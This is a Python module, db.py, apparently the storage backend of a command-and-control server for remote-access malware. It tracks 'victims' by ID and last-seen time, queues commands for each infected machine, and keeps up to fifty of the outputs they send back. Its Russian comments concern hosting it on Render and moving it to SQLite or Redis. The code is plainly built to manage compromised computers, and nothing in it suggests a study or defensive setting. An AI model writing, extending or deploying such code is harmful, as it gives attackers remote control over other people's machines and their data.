# language: Python, file: db.py
# In-memory. На Render обнуляется при рестарте/спин-дауне.
# Для продакшена — SQLite на диске или Redis.

from collections import defaultdict
import time

victims: dict[str, dict] = {}
queues: dict[str, list[str]] = defaultdict(list)
results: dict[str, list[str]] = defaultdict(list)

def register(vid: str, info: dict) -> None:
    victims[vid] = {"last_seen": time.time(), "info": info}
    queues.setdefault(vid, [])
    results.setdefault(vid, [])

def touch(vid: str) -> None:
    if vid in victims:
        victims[vid]["last_seen"] = time.time()

def is_online(vid: str, timeout: int = 30) -> bool:
    v = victims.get(vid)
    return bool(v and time.time() - v["last_seen"] < timeout)

def enqueue(vid: str, cmd: str) -> bool:
    if vid not in victims:
        return False
    queues[vid].append(cmd)
    return True

def pop_commands(vid: str) -> list[str]:
    cmds = list(queues.get(vid, []))
    queues[vid] = []
    return cmds

def push_result(vid: str, output: str) -> None:
    results[vid].append(output)
    if len(results[vid]) > 50:
        results[vid] = results[vid][-50:]

def list_victims() -> list[tuple[str, dict]]:
    return sorted(victims.items(), key=lambda kv: kv[1]["last_seen"], reverse=True)
